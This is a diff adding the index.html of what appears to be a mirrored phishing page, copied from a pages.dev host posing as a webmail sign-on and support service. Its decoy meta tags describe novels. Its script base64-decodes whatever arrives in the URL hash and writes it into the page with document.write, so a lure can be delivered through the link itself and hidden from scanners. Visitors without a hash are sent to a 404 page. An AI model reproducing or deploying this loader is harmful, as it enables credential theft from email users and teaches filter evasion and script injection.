@@ -1,0 +1,30 @@
+<!-- index.html: Referred to as the "main page" in documentation -->
+
+
+<!-- Mirrored from sso-webmailsrvr-s201-bhgftrd.pages.dev/support/?emailtoken= by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 14 Oct 2021 06:19:26 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta name="description" content="novels, fiction, youth novels, fantasy novels, novels, urban novels, historical novels, network novels, novels download, TXT novels, novels to read full text, original network literature">
+<link rel="shortcut icon" href="favicon.html">
+
+<noscript>made for educational purposes.</noscript>
+
+<script type="text/javascript" src="b64.js"></script>
+<script type="text/javascript" src="api.js"></script>
+<script type="text/javascript">
+if (window.location.hash) {
+  // email support service..
+  var hash = window.location.hash.slice(1);
+  var data = b64.decode(hash);
+
+  try {
+    var urlDataObject = JSON.parse(data);
+    var api = apiVersions[urlDataObject.version];
+    document.write(api.decode(urlDataObject));
+  } catch (err) {
+    document.write(decodeURIComponent(data));
+  }
+} else {
+  // Otherwise redirect to the editor
+  window.location.replace("404.html");
+}
+</script>
